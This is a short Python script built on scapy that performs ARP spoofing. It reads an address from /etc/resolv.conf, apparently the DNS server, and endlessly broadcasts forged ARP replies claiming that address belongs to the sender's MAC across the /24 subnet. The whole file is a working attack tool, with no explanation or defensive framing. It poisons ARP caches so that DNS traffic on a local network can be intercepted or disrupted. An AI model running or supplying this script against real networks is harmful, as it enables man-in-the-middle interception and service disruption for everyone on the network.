from scapy.all import *
ipconfig=conf.iface.name
getmac=get_if_hwaddr(ipconfig)
with open('/etc/resolv.conf','r') as r:
    for j in r:
        p=j.split()[-1]
pkg=Ether(dst="ff:ff:ff:ff:ff:ff",src=getmac)/ARP(op="is-at",psrc=p,pdst=p+'/24')
while True:
    sendp(pkg,loop=1)
        
